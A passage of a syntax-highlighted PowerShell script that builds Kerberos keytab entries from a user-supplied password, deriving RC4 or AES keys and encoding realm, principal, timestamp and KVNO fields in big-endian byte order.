</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>function</span><span class=w> </span><span class=nb>Get-BytesBigEndian</span> <span class=p>{</span>
</span></span><span class=line><span class=cl><span class=k>param</span> <span class=p>(</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=nb>Parameter</span><span class=p>(</span><span class=na>Mandatory</span><span class=p>=</span><span class=vm>$true</span><span class=p>)]</span><span class=nv>$Value</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=nb>Parameter</span><span class=p>(</span><span class=na>Mandatory</span><span class=p>=</span><span class=vm>$true</span><span class=p>)][</span><span class=nb>ValidateSet</span><span class=p>(</span><span class=s2>&#34;16&#34;</span><span class=p>,</span> <span class=s2>&#34;32&#34;</span><span class=p>)][</span><span class=no>String[]</span><span class=p>]</span><span class=nv>$BitSize</span>
</span></span><span class=line><span class=cl><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c>### Set Key Type</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=no>byte[]</span><span class=p>]</span> <span class=nv>$bytes</span> <span class=p>=</span> <span class=vm>@</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=k>switch</span><span class=p>(</span><span class=nv>$BitSize</span><span class=p>){</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;16&#34;</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$bytes</span> <span class=p>=</span> <span class=p>[</span><span class=no>BitCOnverter</span><span class=p>]::</span><span class=n>GetBytes</span><span class=p>([</span><span class=no>int16</span><span class=p>]</span><span class=nv>$Value</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>([</span><span class=no>BitCOnverter</span><span class=p>]::</span><span class=n>IsLittleEndian</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=p>[</span><span class=no>Array</span><span class=p>]::</span><span class=n>Reverse</span><span class=p>(</span><span class=nv>$bytes</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;32&#34;</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$bytes</span> <span class=p>=</span> <span class=p>[</span><span class=no>BitCOnverter</span><span class=p>]::</span><span class=n>GetBytes</span><span class=p>([</span><span class=no>int32</span><span class=p>]</span><span class=nv>$Value</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>([</span><span class=no>BitCOnverter</span><span class=p>]::</span><span class=n>IsLittleEndian</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=p>[</span><span class=no>Array</span><span class=p>]::</span><span class=n>Reverse</span><span class=p>(</span><span class=nv>$bytes</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>     <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>default</span><span class=p>{}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>return</span> <span class=nv>$bytes</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>function</span><span class=w> </span><span class=nb>Get-PrincipalType</span> <span class=p>{</span>
</span></span><span class=line><span class=cl><span class=k>param</span> <span class=p>(</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=nb>Parameter</span><span class=p>(</span><span class=na>Mandatory</span><span class=p>=</span><span class=vm>$true</span><span class=p>)][</span><span class=nb>ValidateSet</span><span class=p>(</span><span class=s2>&#34;KRB5_NT_PRINCIPAL&#34;</span><span class=p>,</span> <span class=s2>&#34;KRB5_NT_SRV_INST&#34;</span><span class=p>,</span> <span class=s2>&#34;KRB5_NT_SRV_HST&#34;</span><span class=p>,</span> <span class=s2>&#34;KRB5_NT_UID&#34;</span><span class=p>)][</span><span class=no>String[]</span><span class=p>]</span><span class=nv>$PrincipalType</span>
</span></span><span class=line><span class=cl><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=no>byte[]</span><span class=p>]</span> <span class=nv>$nameType</span> <span class=p>=</span> <span class=vm>@</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>switch</span><span class=p>(</span><span class=nv>$PrincipalType</span><span class=p>){</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;KRB5_NT_PRINCIPAL&#34;</span><span class=p>{</span><span class=nv>$nameType</span> <span class=p>=</span> <span class=vm>@</span><span class=p>(</span><span class=mf>00</span><span class=p>,</span><span class=mf>00</span><span class=p>,</span><span class=mf>00</span><span class=p>,</span><span class=mf>01</span><span class=p>);</span><span class=k>break</span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;KRB5_NT_SRV_INST&#34;</span><span class=p>{</span><span class=nv>$nameType</span> <span class=p>=</span> <span class=vm>@</span><span class=p>(</span><span class=mf>00</span><span class=p>,</span><span class=mf>00</span><span class=p>,</span><span class=mf>00</span><span class=p>,</span><span class=mf>02</span><span class=p>);</span><span class=k>break</span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;KRB5_NT_SRV_HST&#34;</span><span class=p>{</span><span class=nv>$nameType</span> <span class=p>=</span> <span class=vm>@</span><span class=p>(</span><span class=mf>00</span><span class=p>,</span><span class=mf>00</span><span class=p>,</span><span class=mf>00</span><span class=p>,</span><span class=mf>03</span><span class=p>);</span><span class=k>break</span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;KRB5_NT_UID&#34;</span><span class=p>{</span><span class=nv>$nameType</span> <span class=p>=</span> <span class=vm>@</span><span class=p>(</span><span class=mf>00</span><span class=p>,</span><span class=mf>00</span><span class=p>,</span><span class=mf>00</span><span class=p>,</span><span class=mf>05</span><span class=p>);</span><span class=k>break</span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>default</span><span class=p>{</span><span class=nv>$nameType</span> <span class=p>=</span> <span class=vm>@</span><span class=p>(</span><span class=mf>00</span><span class=p>,</span><span class=mf>00</span><span class=p>,</span><span class=mf>00</span><span class=p>,</span><span class=mf>01</span><span class=p>);</span><span class=k>break</span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>return</span> <span class=nv>$nameType</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>function</span><span class=w> </span><span class=nb>Create-KeyTabEntry</span> <span class=p>{</span>
</span></span><span class=line><span class=cl><span class=k>param</span> <span class=p>(</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=nb>Parameter</span><span class=p>(</span><span class=na>Mandatory</span><span class=p>=</span><span class=vm>$true</span><span class=p>)]</span><span class=nv>$PasswordString</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=nb>Parameter</span><span class=p>(</span><span class=na>Mandatory</span><span class=p>=</span><span class=vm>$true</span><span class=p>)]</span><span class=nv>$RealmString</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=nb>Parameter</span><span class=p>(</span><span class=na>Mandatory</span><span class=p>=</span><span class=vm>$true</span><span class=p>)]</span><span class=nv>$Components</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=nb>Parameter</span><span class=p>(</span><span class=na>Mandatory</span><span class=p>=</span><span class=vm>$false</span><span class=p>)]</span><span class=nv>$SALT</span><span class=p>=</span><span class=s2>&#34;&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=nb>Parameter</span><span class=p>(</span><span class=na>Mandatory</span><span class=p>=</span><span class=vm>$false</span><span class=p>)]</span><span class=nv>$KVNO</span><span class=p>=</span><span class=mf>1</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=nb>Parameter</span><span class=p>(</span><span class=na>Mandatory</span><span class=p>=</span><span class=vm>$true</span><span class=p>)][</span><span class=nb>ValidateSet</span><span class=p>(</span><span class=s2>&#34;KRB5_NT_PRINCIPAL&#34;</span><span class=p>,</span> <span class=s2>&#34;KRB5_NT_SRV_INST&#34;</span><span class=p>,</span> <span class=s2>&#34;KRB5_NT_SRV_HST&#34;</span><span class=p>,</span> <span class=s2>&#34;KRB5_NT_UID&#34;</span><span class=p>)][</span><span class=no>String[]</span><span class=p>]</span><span class=nv>$PrincipalType</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=nb>Parameter</span><span class=p>(</span><span class=na>Mandatory</span><span class=p>=</span><span class=vm>$true</span><span class=p>)][</span><span class=nb>ValidateSet</span><span class=p>(</span><span class=s2>&#34;RC4&#34;</span><span class=p>,</span> <span class=s2>&#34;AES128&#34;</span><span class=p>,</span> <span class=s2>&#34;AES256&#34;</span><span class=p>)][</span><span class=no>String[]</span><span class=p>]</span><span class=nv>$EncryptionKeyType</span>
</span></span><span class=line><span class=cl><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c>### Key Types: RC4 0x17 (23), AES128  0x11 (17), AES256  0x12 (18)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c>### Set Key Type</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=no>byte[]</span><span class=p>]</span> <span class=nv>$keyType</span> <span class=p>=</span> <span class=vm>@</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=no>byte[]</span><span class=p>]</span> <span class=nv>$sizeKeyBlock</span> <span class=p>=</span> <span class=vm>@</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>switch</span><span class=p>(</span><span class=nv>$EncryptionKeyType</span><span class=p>){</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;RC4&#34;</span><span class=p>{</span>
</span></span><span class=line><span class=cl>       <span class=nv>$keyType</span> <span class=p>=</span> <span class=vm>@</span><span class=p>(</span><span class=mf>00</span><span class=p>,</span><span class=mf>23</span><span class=p>)</span>
</span></span><span class=line><span class=cl>       <span class=nv>$sizeKey</span> <span class=p>=</span> <span class=mf>16</span>
</span></span><span class=line><span class=cl>       <span class=nv>$sizeKeyBlock</span> <span class=p>=</span> <span class=vm>@</span><span class=p>(</span><span class=mf>00</span><span class=p>,</span><span class=mf>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>       <span class=c>### Create RC4-HMAC Key. Unicode is required for MD4 hash input.</span>
</span></span><span class=line><span class=cl>       <span class=p>[</span><span class=no>byte[]</span><span class=p>]</span><span class=nv>$password</span> <span class=p>=</span> <span class=p>[</span><span class=no>Text.Encoding</span><span class=p>]::</span><span class=n>Unicode</span><span class=p>.</span><span class=py>GetBytes</span><span class=p>(</span><span class=nv>$passwordString</span><span class=p>)</span>
</span></span><span class=line><span class=cl>       <span class=nv>$keyBlock</span> <span class=p>=</span> <span class=nb>Get-MD4</span> <span class=n>-bArray</span> <span class=nv>$password</span> <span class=n>-UpperCase</span>
</span></span><span class=line><span class=cl>       <span class=k>break</span>
</span></span><span class=line><span class=cl>       <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;AES128&#34;</span><span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$keyType</span> <span class=p>=</span> <span class=vm>@</span><span class=p>(</span><span class=mf>00</span><span class=p>,</span><span class=mf>17</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nv>$sizeKey</span> <span class=p>=</span> <span class=mf>16</span>
</span></span><span class=line><span class=cl>        <span class=nv>$sizeKeyBlock</span> <span class=p>=</span> <span class=vm>@</span><span class=p>(</span><span class=mf>00</span><span class=p>,</span><span class=mf>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=c>#$keyBlock = Get-AES128Key -PasswordString $passwordString -Realm $RealmString -Principal $PrincipalString -SALT $SALT</span>
</span></span><span class=line><span class=cl>        <span class=nv>$keyBlock</span> <span class=p>=</span> <span class=nb>Get-AES128Key</span> <span class=n>-PasswordString</span> <span class=nv>$passwordString</span> <span class=n>-SALT</span> <span class=nv>$SALT</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;AES256&#34;</span><span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$keyType</span> <span class=p>=</span> <span class=vm>@</span><span class=p>(</span><span class=mf>00</span><span class=p>,</span><span class=mf>18</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nv>$sizeKey</span> <span class=p>=</span> <span class=mf>32</span>
</span></span><span class=line><span class=cl>        <span class=nv>$sizeKeyBlock</span> <span class=p>=</span> <span class=vm>@</span><span class=p>(</span><span class=mf>00</span><span class=p>,</span><span class=mf>32</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=c>#$keyBlock = Get-AES256Key -PasswordString $passwordString -Realm $RealmString -Principal $PrincipalString -SALT $SALT</span>
</span></span><span class=line><span class=cl>        <span class=nv>$keyBlock</span> <span class=p>=</span> <span class=nb>Get-AES256Key</span> <span class=n>-PasswordString</span> <span class=nv>$passwordString</span> <span class=n>-SALT</span> <span class=nv>$SALT</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>default</span><span class=p>{}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c>### Set Principal Type</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=no>byte[]</span><span class=p>]</span> <span class=nv>$nameType</span> <span class=p>=</span> <span class=vm>@</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=k>switch</span><span class=p>(</span><span class=nv>$PrincipalType</span><span class=p>){</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;KRB5_NT_PRINCIPAL&#34;</span><span class=p>{</span><span class=nv>$nameType</span> <span class=p>=</span> <span class=vm>@</span><span class=p>(</span><span class=mf>00</span><span class=p>,</span><span class=mf>00</span><span class=p>,</span><span class=mf>00</span><span class=p>,</span><span class=mf>01</span><span class=p>);</span><span class=k>break</span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;KRB5_NT_SRV_INST&#34;</span><span class=p>{</span><span class=nv>$nameType</span> <span class=p>=</span> <span class=vm>@</span><span class=p>(</span><span class=mf>00</span><span class=p>,</span><span class=mf>00</span><span class=p>,</span><span class=mf>00</span><span class=p>,</span><span class=mf>02</span><span class=p>);</span><span class=k>break</span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;KRB5_NT_SRV_HST&#34;</span><span class=p>{</span><span class=nv>$nameType</span> <span class=p>=</span> <span class=vm>@</span><span class=p>(</span><span class=mf>00</span><span class=p>,</span><span class=mf>00</span><span class=p>,</span><span class=mf>00</span><span class=p>,</span><span class=mf>03</span><span class=p>);</span><span class=k>break</span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;KRB5_NT_UID&#34;</span><span class=p>{</span><span class=nv>$nameType</span> <span class=p>=</span> <span class=vm>@</span><span class=p>(</span><span class=mf>00</span><span class=p>,</span><span class=mf>00</span><span class=p>,</span><span class=mf>00</span><span class=p>,</span><span class=mf>05</span><span class=p>);</span><span class=k>break</span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>default</span><span class=p>{</span><span class=nv>$nameType</span> <span class=p>=</span> <span class=vm>@</span><span class=p>(</span><span class=mf>00</span><span class=p>,</span><span class=mf>00</span><span class=p>,</span><span class=mf>00</span><span class=p>,</span><span class=mf>01</span><span class=p>);</span><span class=k>break</span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c>### KVNO larger than 255 requires 32bit KVNO field at the end of the record</span>
</span></span><span class=line><span class=cl><span class=nv>$vno</span> <span class=p>=</span> <span class=vm>@</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nv>$kvno</span> <span class=o>-le</span> <span class=mf>255</span><span class=p>){</span>
</span></span><span class=line><span class=cl><span class=nv>$vno</span> <span class=p>=</span> <span class=vm>@</span><span class=p>([</span><span class=no>byte</span><span class=p>]</span><span class=nv>$kvno</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl><span class=nv>$vno</span> <span class=p>=</span> <span class=vm>@</span><span class=p>(</span><span class=mf>00</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=no>byte[]</span><span class=p>]</span><span class=nv>$numComponents</span> <span class=p>=</span> <span class=nb>Get-BytesBigEndian</span> <span class=n>-BitSize</span> <span class=mf>16</span> <span class=n>-Value</span> <span class=nv>$components</span><span class=p>.</span><span class=py>Count</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c>### To Set TimeStamp To Jan 1, 1970 - [byte[]]$timeStamp = @(0,0,0,0)</span>
</span></span><span class=line><span class=cl><span class=c>### [byte[]]$timeStamp = Get-BytesBigEndian -BitSize 32 -Value ([int]([Math]::Truncate((Get-Date(Get-Date).ToUniversalTime() -UFormat %s))))</span>
</span></span><span class=line><span class=cl><span class=c>### 15 September 2020 Updated</span>
</span></span><span class=line><span class=cl><span class=c>### https://github.com/matherm-aboehm suggested use of [decimal]::Parse to fix timestamp error on localized versions of Windows.</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=no>byte[]</span><span class=p>]</span><span class=nv>$timeStamp</span> <span class=p>=</span> <span class=nb>Get-BytesBigEndian</span> <span class=n>-BitSize</span> <span class=mf>32</span> <span class=n>-Value</span> <span class=p>([</span><span class=no>int</span><span class=p>]([</span><span class=no>Math</span><span class=p>]::</span><span class=n>Truncate</span><span class=p>([</span><span class=no>decimal</span><span class=p>]::</span><span class=n>Parse</span><span class=p>((</span><span class=nb>Get-Date</span><span class=p>(</span><span class=nb>Get-Date</span><span class=p>).</span><span class=py>ToUniversalTime</span><span class=p>()</span> <span class=n>-UFormat</span> <span class=k>%</span><span class=n>s</span><span class=p>)))))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c>### Data size information for KeyEntry</span>
</span></span><span class=line><span class=cl><span class=c># num_components bytes   = 2</span>
</span></span><span class=line><span class=cl><span class=c># realm bytes            = variable (2 bytes) + length</span>
</span></span><span class=line><span class=cl><span class=c># components array bytes = varable (2 bytes) + length for each component. Component count should be typically 1 or 2.</span>
</span></span><span class=line><span class=cl><span class=c># name type bytes        = 4</span>
</span></span><span class=line><span class=cl><span class=c># timestamp bytes        = 4</span>
</span></span><span class=line><span class=cl><span class=c># kvno bytes             = 1 or 4</span>
</span></span><span class=line><span class=cl><span class=c># Key Type bytes         = 2</span>
</span></span><span class=line><span class=cl><span class=c># Key bytes              = 2 + 16 or 32 &#34;RC4 and AES128 are 16 Byte Keys. AES 256 is 32&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$sizeRealm</span>  <span class=p>=</span> <span class=nb>Get-BytesBigEndian</span> <span class=n>-Value</span> <span class=p>([</span><span class=no>Text.Encoding</span><span class=p>]::</span><span class=n>UTF8</span><span class=p>.</span><span class=py>GetByteCount</span><span class=p>(</span><span class=nv>$realmString</span><span class=p>))</span> <span class=n>-BitSize</span> <span class=mf>16</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=no>Int32</span><span class=p>]</span><span class=nv>$sizeKeyTabEntry</span> <span class=p>=</span> <span class=mf>2</span> <span class=c>#NumComponentsSize</span>
</span></span><span class=line><span class=cl><span class=nv>$sizeKeyTabEntry</span> <span class=p>+=</span> <span class=mf>2</span> <span class=c>#RealmLength Byte Count </span>
</span></span><span class=line><span class=cl><span class=nv>$sizeKeyTabEntry</span> <span class=p>+=</span> <span class=p>([</span><span class=no>Text.Encoding</span><span class=p>]::</span><span class=n>UTF8</span><span class=p>.</span><span class=py>GetByteCount</span><span class=p>(</span><span class=nv>$realmString</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>foreach</span><span class=p>(</span><span class=nv>$principal</span> <span class=k>in</span> <span class=nv>$Components</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=nv>$sizePrincipal</span> <span class=p>=</span> <span class=p>([</span><span class=no>Text.Encoding</span><span class=p>]::</span><span class=n>UTF8</span><span class=p>.</span><span class=py>GetByteCount</span><span class=p>(</span><span class=nv>$principal</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=nv>$sizeKeyTabEntry</span> <span class=p>+=</span> <span class=nv>$sizePrincipal</span> <span class=p>+</span> <span class=mf>2</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nv>$sizeKeyTabEntry</span> <span class=p>+=</span> <span class=mf>4</span> <span class=c>#NameType</span>
</span></span><span class=line><span class=cl><span class=nv>$sizeKeyTabEntry</span> <span class=p>+=</span> <span class=mf>4</span> <span class=c>#TimeStamp</span>
</span></span><span class=line><span class=cl><span class=nv>$sizeKeyTabEntry</span> <span class=p>+=</span> <span class=mf>1</span> <span class=c>#KVNO 8bit</span>
</span></span><span class=line><span class=cl><span class=nv>$sizeKeyTabEntry</span> <span class=p>+=</span> <span class=mf>2</span> <span class=c>#KeyType</span>
</span></span><span class=line><span class=cl><span class=nv>$sizeKeyTabEntry</span> <span class=p>+=</span> <span class=mf>2</span> <span class=c>#Key Length Count</span>
</span></span><span class=line><span class=cl><span class=nv>$sizeKeyTabEntry</span> <span class=p>+=</span> <span class=nv>$sizeKey</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$sizeTotal</span> <span class=p>=</span> <span class=nb>Get-BytesBigEndian</span> <span class=n>-Value</span> <span class=nv>$sizeKeyTabEntry</span> <span class=n>-BitSize</span> <span class=mf>32</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=no>byte[]</span><span class=p>]</span> <span class=nv>$keytabEntry</span> <span class=p>=</span> <span class=vm>@</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=nv>$keytabEntry</span> <span class=p>+=</span> <span class=nv>$sizeTotal</span>
</span></span><span class=line><span class=cl><span class=nv>$keytabEntry</span> <span class=p>+=</span> <span class=nv>$numComponents</span>
</span></span><span class=line><span class=cl><span class=nv>$keytabEntry</span> <span class=p>+=</span> <span class=nv>$sizeRealm</span>
</span></span><span class=line><span class=cl><span class=nv>$keytabEntry</span> <span class=p>+=</span> <span class=p>[</span><span class=no>byte[]][Text.Encoding</span><span class=p>]::</span><span class=n>UTF8</span><span class=p>.</span><span class=py>GetBytes</span><span class=p>(</span><span class=nv>$realmString</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>foreach</span><span class=p>(</span><span class=nv>$principal</span> <span class=k>in</span> <span class=nv>$Components</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=nv>$sizePrincipal</span> <span class=p>=</span> <span class=nb>Get-BytesBigEndian</span> <span class=n>-Value</span> <span class=p>([</span><span class=no>Text.Encoding</span><span class=p>]::</span><span class=n>UTF8</span><span class=p>.</span><span class=py>GetByteCount</span><span class=p>(</span><span class=nv>$principal</span><span class=p>))</span> <span class=n>-BitSize</span> <span class=mf>16</span>
</span></span><span class=line><span class=cl>    <span class=nv>$keytabEntry</span> <span class=p>+=</span> <span class=nv>$sizePrincipal</span>
</span></span><span class=line><span class=cl>    <span class=nv>$keytabEntry</span> <span class=p>+=</span> <span class=p>[</span><span class=no>byte[]][Text.Encoding</span><span class=p>]::</span><span class=n>UTF8</span><span class=p>.</span><span class=py>GetBytes</span><span class=p>(</span><span class=nv>$principal</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nv>$keytabEntry</span> <span class=p>+=</span> <span class=nv>$nameType</span>
</span></span><span class=line><span class=cl><span class=nv>$keytabEntry</span> <span class=p>+=</span> <span class=nv>$timeStamp</span>
</span></span><span class=line><span class=cl><span class=nv>$keytabEntry</span> <span class=p>+=</span> <span class=nv>$vno</span>
</span></span><span class=line><span class=cl><span class=nv>$keytabEntry</span> <span class=p>+=</span> <span class=nv>$keyType</span>
</span></span><span class=line><span class=cl><span class=nv>$keytabEntry</span> <span class=p>+=</span> <span class=nv>$sizeKeyBlock</span>
</span></span><span class=line><span class=cl><span class=nv>$keytabEntry</span> <span class=p>+=</span> <span class=nb>Get-ByteArrayFromHexString</span> <span class=n>-HexString</span> <span class=nv>$keyBlock</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$keytabEntryObject</span> <span class=p>=</span> <span class=p>[</span><span class=no>PsCustomObject</span><span class=p>]</span><span class=vm>@</span><span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>Size</span>           <span class=p>=</span> <span class=nv>$sizeKeyTabEntry</span>
</span></span><span class=line><span class=cl>        <span class=n>NumComponents</span>  <span class=p>=</span> <span class=nv>$numComponents</span>
</span></span><span class=line><span class=cl>        <span class=n>Realm</span>          <span class=p>=</span> <span class=p>[</span><span class=no>byte[]][Text.Encoding</span><span class=p>]::</span><span class=n>UTF8</span><span class=p>.</span><span class=py>GetBytes</span><span class=p>(</span><span class=nv>$realmString</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>Components</span>     <span class=p>=</span> <span class=nv>$components</span>
</span></span><span class=line><span class=cl>        <span class=n>NameType</span>       <span class=p>=</span> <span class=nv>$nameType</span>
</span></span><span class=line><span class=cl>        <span class=n>TimeStamp</span>      <span class=p>=</span> <span class=nv>$timeStamp</span>
</span></span><span class=line><span class=cl>        <span class=n>KeyType</span>        <span class=p>=</span> <span class=nv>$keyType</span>
</span></span><span class=line><span class=cl>        <span class=n>KeyBlock</span>       <span class=p>=</span> <span class=nv>$keyBlock</span>
</span></span><span class=line><span class=cl>        <span class=n>KeytabEntry</span>    <span class=p>=</span> <span class=nv>$keytabEntry</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>return</span> <span class=nv>$keytabEntryObject</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>Function</span><span class=w> </span><span class=nb>Get-Password</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nv>$passwordSecure</span> <span class=p>=</span> <span class=nb>Read-Host</span> <span class=n>-Prompt</span> <span class=s2>&#34;Enter Password&#34;</span> <span class=n>-AsSecureString</span>
</span></span><span class=line><span class=cl>        <span class=nv>$passwordBSTR</span> <span class=p>=</span> <span class=p>[</span><span class=no>System.Runtime.InteropServices.Marshal</span><span class=p>]::</span><span class=n>SecureStringToBSTR</span><span class=p>(</span><span class=nv>$passwordSecure</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nv>$password</span> <span class=p>=</span> <span class=p>[</span><span class=no>System.Runtime.InteropServices.Marshal</span><span class=p>]::</span><span class=n>PtrToStringAuto</span><span class=p>(</span><span class=nv>$passwordBSTR</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>return</span> <span class=nv>$password</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>([</span><span class=no>string</span><span class=p>]::</span><span class=n>IsNullOrEmpty</span><span class=p>(</span><span class=nv>$Password</span><span class=p>)){</span><span class=nv>$Password</span> <span class=p>=</span> <span class=vm>$</span><span class=p>(</span><span class=nb>Get-Password</span><span class=p>)}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>([</span><span class=no>string</span><span class=p>]::</span><span class=n>IsNullOrEmpty</span><span class=p>(</span><span class=nv>$File</span><span class=p>)){</span><span class=nv>$File</span><span class=p>=</span><span class=vm>$</span><span class=p>(</span><span class=nb>Get-Location</span><span class=p>).</span><span class=n>Path</span><span class=p>+</span><span class=s1>&#39;\login.keytab&#39;</span><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nv>$Quiet</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl><span class=nv>$Script:Silent</span> <span class=p>=</span> <span class=vm>$true</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl><span class=nv>$Script:Silent</span> <span class=p>=</span> <span class=vm>$false</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c>### Force Realm to UPPERCASE</span>
